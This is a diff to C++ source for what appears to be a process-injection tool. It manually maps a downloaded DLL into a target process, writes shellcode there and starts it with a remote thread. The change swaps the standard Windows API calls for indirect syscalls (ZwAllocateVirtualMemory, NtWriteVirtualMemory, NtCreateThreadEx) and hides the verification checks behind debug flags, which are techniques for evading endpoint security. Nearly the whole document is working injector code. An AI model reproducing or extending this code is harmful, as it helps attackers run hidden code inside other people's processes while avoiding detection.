@@ -9,8 +9,9 @@
     /MT              # (optional) link the static CRT if need to use a few CRT routines, try avoid CRT entirely 
 */
 
-#define DEBUG 0
+// #define DEBUG 0
 
+#include "YetAnotherGate.h"
 #include "injection.h"
 #include "DbgMacros.h"
 #include <winternl.h>
@@ -40,12 +41,31 @@ struct _RESOURCES
 }sResources_for_shellcode;
 
 ///////////////////////////////////////////////////////////////////////////////
-static void* FindExportAddress(HMODULE, const char*);
+static void* injection_FindExportAddress(HMODULE, const char*);
 
 extern "C" __declspec(noinline) void __stdcall shellcode(LPVOID);
 extern "C" int AddTwoNumbers(int a, int b);
 extern "C" void Suicide(BYTE* pBase, void* my_NtFreeVirtualMemory, void* my_RtlExitUserThread, void* my_VirtualProtect);
 ///////////////////////////////////////////////////////////////////////////////
+
+bool setup_syscall_engine()
+{
+
+    Sys_stb syscallEntries[MAX_SYSCALLS];
+    size_t numSyscalls = 0;
+
+    syscallEntries[numSyscalls++] = {"ZwAllocateVirtualMemory", 0, 0, nullptr, nullptr};
+    syscallEntries[numSyscalls++] = {"NtWriteVirtualMemory", 0, 0, nullptr, nullptr};
+    syscallEntries[numSyscalls++] = {"NtCreateThreadEx", 0, 0, nullptr, nullptr};
+
+    if(!InitSyscallGate(syscallEntries, numSyscalls))
+    {
+        fuk("Syscall Engine error");
+        return false;
+    }
+
+    return true;
+}
 
 NTSTATUS SanityCheck()
 {
@@ -149,6 +169,9 @@ NTSTATUS SanityCheck()
 
 NTSTATUS ManualMap(HANDLE hproc, DWORD PID, std::vector <unsigned char> *downloaded_dll)
 {
+    
+    if(!setup_syscall_engine()) { fuk("Something broke while setting up syscall engine"); return 1; }
+    
     norm("\n===========================================ManualMap===========================================");
 
     pSourceBase = downloaded_dll->data();
@@ -171,30 +194,40 @@ NTSTATUS ManualMap(HANDLE hproc, DWORD PID, std::vector <unsigned char> *downloa
             Protect should be 0x40
     */
 
-    pTargetBase = reinterpret_cast<BYTE*>(VirtualAllocEx(hproc, reinterpret_cast<void *>(pOptionalHeader->ImageBase), pOptionalHeader->SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
-    if(!pTargetBase)
+    PVOID baseAddress = reinterpret_cast<void*>(pOptionalHeader->ImageBase);
+    SIZE_T regionSize = pOptionalHeader->SizeOfImage;
+
+    NTSTATUS Sysstatus = (NTSTATUS)(uintptr_t)SysFunction("ZwAllocateVirtualMemory", hproc, &baseAddress, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if(Sysstatus != 0x00000000) 
     {
-        warn("Allocation on preffered base failed, allocating randomly\n");
-        
-        pTargetBase = reinterpret_cast<BYTE*>(VirtualAllocEx(hproc, nullptr, pOptionalHeader->SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
-        if(!pTargetBase)
+        warn("Allocation on preferred base failed, allocating randomly\n");
+
+        baseAddress = nullptr;
+        regionSize = pOptionalHeader->SizeOfImage;
+
+        Sysstatus = (NTSTATUS)(uintptr_t)SysFunction("ZwAllocateVirtualMemory", hproc, &baseAddress, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        if(Sysstatus != 0x00000000)
         {
-            fuk("Coudnt allocate memory ", GetLastError());
+            fuk("Couldn't allocate memory. Status: 0x%X", Sysstatus);
             delete[] pSourceBase;
             return 0;
         }
-    } norm(std::hex, "\nAllocated ", CYAN"0x", pOptionalHeader->SizeOfImage, " bytes (", pOptionalHeader->SizeOfImage / 1024, " KB)", RESET" remote Memory at -> ", CYAN"0x", (uintptr_t)pTargetBase);
+    } pTargetBase = reinterpret_cast<BYTE*>(baseAddress);
+    norm(std::hex, "\nAllocated ", CYAN"0x", pOptionalHeader->SizeOfImage, " bytes (", pOptionalHeader->SizeOfImage / 1024, " KB)", RESET" remote Memory at -> ", CYAN"0x", (uintptr_t)pTargetBase);
 
 
-    //verify
-    MEMORY_BASIC_INFORMATION mbi;
-    LPVOID baseAddress = 0;
+    #if DEBUG | DEBUG_FILE | DEBUG_VECTOR
 
-    if(VirtualQueryEx(hproc, pTargetBase, &mbi, sizeof(mbi)) == sizeof(mbi))
-    {
-        if(mbi.State == 0x1000 && mbi.Type == 0x20000 && mbi.Protect == 0x40) norm(std::hex,"\n[", GREEN"OK", RESET"] ", "State ", CYAN"", mbi.State, RESET" Type ", CYAN"0x", mbi.Type, RESET" Protect ", CYAN"0x", mbi.Protect, "\n");
-        else norm(std::hex, "\n[", RED"ISSUE", RESET"] ", "State ", CYAN"", mbi.State, RESET" Type ", CYAN"0x", mbi.Type, RESET" Protect ", CYAN"0x", mbi.Protect);
-    } else fuk("VirtualQueryEx failed");
+        //verify
+        MEMORY_BASIC_INFORMATION mbi;
+
+        if(VirtualQueryEx(hproc, pTargetBase, &mbi, sizeof(mbi)) == sizeof(mbi))
+        {
+            if(mbi.State == 0x1000 && mbi.Type == 0x20000 && mbi.Protect == 0x40) norm(std::hex,"\n[", GREEN"OK", RESET"] ", "State ", CYAN"", mbi.State, RESET" Type ", CYAN"0x", mbi.Type, RESET" Protect ", CYAN"0x", mbi.Protect, "\n");
+            else norm(std::hex, "\n[", RED"ISSUE", RESET"] ", "State ", CYAN"", mbi.State, RESET" Type ", CYAN"0x", mbi.Type, RESET" Protect ", CYAN"0x", mbi.Protect);
+        } else fuk("VirtualQueryEx failed");
+
+    #endif
 
     #pragma endregion
     
@@ -215,20 +248,30 @@ NTSTATUS ManualMap(HANDLE hproc, DWORD PID, std::vector <unsigned char> *downloa
     norm("\n- - - - - - - - - - - - - Copy Headers - - - - - - - - - - - - -");
     norm("\nCopying Headers in the target..");
 
-    if(!WriteProcessMemory(hproc, pTargetBase, pSourceBase, pOptionalHeader->SizeOfHeaders, nullptr))
+    SIZE_T sizeOfHeaders = pOptionalHeader->SizeOfHeaders;
+    LONG_PTR lpNumberOfBytesWritten = NULL;
+
+
+    Sysstatus = (NTSTATUS)(uintptr_t)SysFunction("NtWriteVirtualMemory", hproc, pTargetBase, pSourceBase, sizeOfHeaders, &lpNumberOfBytesWritten);
+    if(Sysstatus != 0x00000000)
     {
-        fuk("Failed to copy headers");
+        fuk("Failed to copy headers Status: ", Sysstatus);
         delete[] pSourceBase;
         return 0;
     }
 
     //= = = = = = = = = = = = = = = = = = = = = = = = =CHECK= = = = = = = = = = = = = = = = = = = = = = = = =
-    // MEMORY_BASIC_INFORMATION mbi;
-    if(VirtualQueryEx(hproc, pTargetBase, &mbi, sizeof(mbi)) != sizeof(mbi))
-    {
-        fuk("Can't query remote region");
-        return false;
-    }
+    
+    #if DEBUG | DEBUG_FILE | DEBUG_VECTOR
+    
+        // MEMORY_BASIC_INFORMATION mbi;
+        if(VirtualQueryEx(hproc, pTargetBase, &mbi, sizeof(mbi)) != sizeof(mbi))
+        {
+            fuk("Can't query remote region");
+            return false;
+        }
+
+    #endif
 
     IMAGE_SECTION_HEADER* pSection = IMAGE_FIRST_SECTION(pNtHeader);
     if(pOptionalHeader->SizeOfHeaders > pSection->PointerToRawData)
@@ -260,18 +303,19 @@ NTSTATUS ManualMap(HANDLE hproc, DWORD PID, std::vector <unsigned char> *downloa
     // IMAGE_SECTION_HEADER* pSection = IMAGE_FIRST_SECTION(pNtHeader);
     for(UINT i = 0; i != pFileHeader->NumberOfSections; ++i, ++pSection)
     {
-        if(pSection->SizeOfRawData)
+        size_t SizeOfRawData_section = pSection->SizeOfRawData;
+        if(SizeOfRawData_section)
         {
             auto pSource = pSourceBase + pSection->PointerToRawData;
             auto pTarget = pTargetBase + pSection->VirtualAddress;
-            
-            if(!WriteProcessMemory(hproc, pTarget, pSource, pSection->SizeOfRawData, nullptr))
+
+            Sysstatus = (NTSTATUS)(uintptr_t)SysFunction("NtWriteVirtualMemory", hproc, pTarget, pSource, SizeOfRawData_section, &lpNumberOfBytesWritten);
+            if(Sysstatus != 0x00000000)
             {
-                fuk("Coudnt copy the sections in target memory");
+                fuk("Failed to copy headers Status: ", Sysstatus);
                 delete[] pSourceBase;
                 return 0;
             }
-            
 
             //= = = = = = = = = = = = = = = = = = = = = = = = =CHECK= = = = = = = = = = = = = = = = = = = = = = = = =
 
@@ -290,15 +334,19 @@ NTSTATUS ManualMap(HANDLE hproc, DWORD PID, std::vector <unsigned char> *downloa
                 return 0;
             }
 
-            MEMORY_BASIC_INFORMATION mbi;
-            if(VirtualQuery((LPCVOID)pTarget, &mbi, sizeof(mbi)) == 0)                     // Verify section is within allocated memory bounds
-            {
-                fuk("Cannot query memory region");
-                delete[] pSourceBase;
-                return 0;
-            }
+            #if DEBUG | DEBUG_FILE | DEBUG_VECTOR
 
-            if(sectionEnd > ((uintptr_t)mbi.BaseAddress + mbi.RegionSize))
+                MEMORY_BASIC_INFORMATION mbi;
+                if(VirtualQuery((LPCVOID)pTarget, &mbi, sizeof(mbi)) == 0)
+                {
+                    fuk("Cannot query memory region");
+                    delete[] pSourceBase;
+                    return 0;
+                }
+
+            #endif
+
+            if(sectionEnd > ((uintptr_t)mbi.BaseAddress + mbi.RegionSize))                     // Verify section is within allocated memory bounds
             {
                 fuk("Section extends beyond allocated memory");
                 delete[] pSourceBase;
@@ -356,46 +404,53 @@ NTSTATUS ManualMap(HANDLE hproc, DWORD PID, std::vector <unsigned char> *downloa
         return 0;
     } norm("\nStart location of ", CYAN"", stubSection->Name, RESET" is", CYAN" 0x", (uintptr_t)vpStartAddressOfShellcode, RESET" size[", CYAN"0x", shellcodeBlockSize, RESET"]");
 
-    BYTE* pShellcodeResourceBase = reinterpret_cast<BYTE*>(VirtualAllocEx(hproc, nullptr, shellcodeBlockSize + sizeof(_RESOURCES), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
-    if(!pShellcodeResourceBase)
+    PVOID pShellcodeResourceBase = nullptr;
+    SIZE_T ShellcoderegionSize = shellcodeBlockSize + sizeof(_RESOURCES);
+
+    Sysstatus = (NTSTATUS)(uintptr_t)SysFunction("ZwAllocateVirtualMemory", hproc, &pShellcodeResourceBase, 0, &ShellcoderegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if(Sysstatus != 0x00000000)
     {
-        fuk("Coudnt allocate memory ", GetLastError());
+        fuk("Couldn't allocate memory. Status: 0x%X", Sysstatus);
         delete[] pSourceBase;
         return 0;
-    } norm(std::hex, "\n\nAllocated ", CYAN"0x", shellcodeBlockSize, " bytes (", shellcodeBlockSize / 1024.0, " KB)", RESET" remote Memory at -> ", CYAN"0x", (uintptr_t)pShellcodeResourceBase);
+    }
 
-    //verify
-    if(VirtualQueryEx(hproc, pShellcodeResourceBase, &mbi, sizeof(mbi)) == sizeof(mbi))
-    {
-        if(mbi.State == 0x1000 && mbi.Type == 0x20000 && mbi.Protect == 0x40) norm(std::hex,"\n[", GREEN"OK", RESET"] ", "State ", CYAN"", mbi.State, RESET" Type ", CYAN"0x", mbi.Type, RESET" Protect ", CYAN"0x", mbi.Protect, "\n");
-        else norm(std::hex, "\n[", RED"ISSUE", RESET"] ", "State ", CYAN"", mbi.State, RESET" Type ", CYAN"0x", mbi.Type, RESET" Protect ", CYAN"0x", mbi.Protect);
-    } else fuk("VirtualQueryEx failed");
+    #if DEBUG | DEBUG_FILE | DEBUG_VECTOR
+
+        //verify
+        if(VirtualQueryEx(hproc, pShellcodeResourceBase, &mbi, sizeof(mbi)) == sizeof(mbi))
+        {
+            if(mbi.State == 0x1000 && mbi.Type == 0x20000 && mbi.Protect == 0x40) norm(std::hex,"\n[", GREEN"OK", RESET"] ", "State ", CYAN"", mbi.State, RESET" Type ", CYAN"0x", mbi.Type, RESET" Protect ", CYAN"0x", mbi.Protect, "\n");
+            else norm(std::hex, "\n[", RED"ISSUE", RESET"] ", "State ", CYAN"", mbi.State, RESET" Type ", CYAN"0x", mbi.Type, RESET" Protect ", CYAN"0x", mbi.Protect);
+        } else fuk("VirtualQueryEx failed");
+
+    #endif
 
     //-------------------------------
-        BYTE* pShellcodeTargetBase = pShellcodeResourceBase + sizeof(sResources_for_shellcode);
+        BYTE* pShellcodeTargetBase = (BYTE*)pShellcodeResourceBase + sizeof(sResources_for_shellcode);
         sResources_for_shellcode.Injected_dll_base = pTargetBase;
         sResources_for_shellcode.Injected_Shellcode_base = pShellcodeTargetBase;
-        sResources_for_shellcode.ResourceBase = pShellcodeResourceBase;
+        sResources_for_shellcode.ResourceBase = (BYTE*)pShellcodeResourceBase;
         sResources_for_shellcode.TargetPid = (HANDLE)(ULONG_PTR)PID;
     //--------------------------------------------------fill resources data before this------------------
 
-    if(!WriteProcessMemory(hproc, pShellcodeResourceBase, &sResources_for_shellcode, sizeof(sResources_for_shellcode), nullptr))
+    Sysstatus = (NTSTATUS)(uintptr_t)SysFunction("NtWriteVirtualMemory", hproc, pShellcodeResourceBase, &sResources_for_shellcode, sizeof(sResources_for_shellcode), &lpNumberOfBytesWritten);
+    if(Sysstatus != 0x00000000)
     {
-        fuk("Failed to copy the shellcode ", GetLastError());
+        fuk("Failed to copy the shellcode resources Status: ", Sysstatus);
         delete[] pSourceBase;
         return 0;
-    } norm("\nShellcode resources Copied to ", std::hex, CYAN"0x", (uintptr_t)pShellcodeResourceBase, RESET" and ends at ", CYAN"0x", (uintptr_t)(pShellcodeResourceBase + sizeof(sResources_for_shellcode)), RESET" size[", CYAN"0x", sizeof(sResources_for_shellcode), RESET"]");
-
+    } norm("\nShellcode_resources Copied to ", std::hex, CYAN"0x", (uintptr_t)(BYTE*)pShellcodeResourceBase, RESET" and ends at ", CYAN"0x", (uintptr_t)((BYTE*)pShellcodeResourceBase + sizeof(sResources_for_shellcode)), RESET" size[", CYAN"0x", sizeof(sResources_for_shellcode), RESET"]");
 
     //-----------------
 
-    if(!WriteProcessMemory(hproc, pShellcodeTargetBase, vpStartAddressOfShellcode, shellcodeBlockSize, nullptr))
+    Sysstatus = (NTSTATUS)(uintptr_t)SysFunction("NtWriteVirtualMemory", hproc, pShellcodeTargetBase, vpStartAddressOfShellcode, shellcodeBlockSize, &lpNumberOfBytesWritten);
+    if(Sysstatus != 0x00000000)
     {
-        fuk("Failed to copy the shellcode ", GetLastError());
+        fuk("Failed to copy the shellcode Status: ", Sysstatus);
         delete[] pSourceBase;
         return 0;
     } norm("\nShellcode Copied to ", std::hex, CYAN"0x", (uintptr_t)pShellcodeTargetBase, RESET" and ends at ", CYAN"0x", (uintptr_t)(pShellcodeTargetBase + shellcodeBlockSize), RESET" size[", CYAN"0x", shellcodeBlockSize, RESET"]");
-
     
     //-----------------
 
@@ -404,14 +459,17 @@ NTSTATUS ManualMap(HANDLE hproc, DWORD PID, std::vector <unsigned char> *downloa
 
     DWORD offsetOfShellcodeInStub = shellcodeRVA - stubSection->VirtualAddress;
     LPVOID pActualShellcodeEntryInTarget = (PBYTE)pShellcodeTargetBase + offsetOfShellcodeInStub;
+    
+    HANDLE hThread = NULL;
+    PVOID pParams = pShellcodeResourceBase;
 
-    DWORD ShellcodeThreadId = 0;
-    if(!CreateRemoteThread(hproc, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(pActualShellcodeEntryInTarget), pShellcodeResourceBase, 0, &ShellcodeThreadId))
+    Sysstatus = (NTSTATUS)(uintptr_t)SysFunction("NtCreateThreadEx", &hThread, THREAD_ALL_ACCESS, nullptr, hproc, pActualShellcodeEntryInTarget, pParams, FALSE, 0, 0, 0, nullptr);
+    if(Sysstatus != 0x00000000)
     {
-        fuk("Failed to create a thread shellcode ", GetLastError());
+        fuk("Failed to create a thread for shellcode : ", Sysstatus);
+        delete[] pSourceBase;
         return 0;
-    } norm("\nThread id -> ", std::dec, CYAN"", (int)ShellcodeThreadId);
-
+    }
 
     norm("\n=_=_=_=_=_=_=_=_=_=_=_=_=_Cpy Shellcode_=_=_=_=_=_=_=_=_=_=_=_=_=");
     #pragma endregion
@@ -428,7 +486,7 @@ NTSTATUS ManualMap(HANDLE hproc, DWORD PID, std::vector <unsigned char> *downloa
     return 1;
 }
 
-static void* FindExportAddress(HMODULE hModule, const char* funcName)
+static void* injection_FindExportAddress(HMODULE hModule, const char* funcName)
 {
     if(!hModule || !funcName) return nullptr;
 
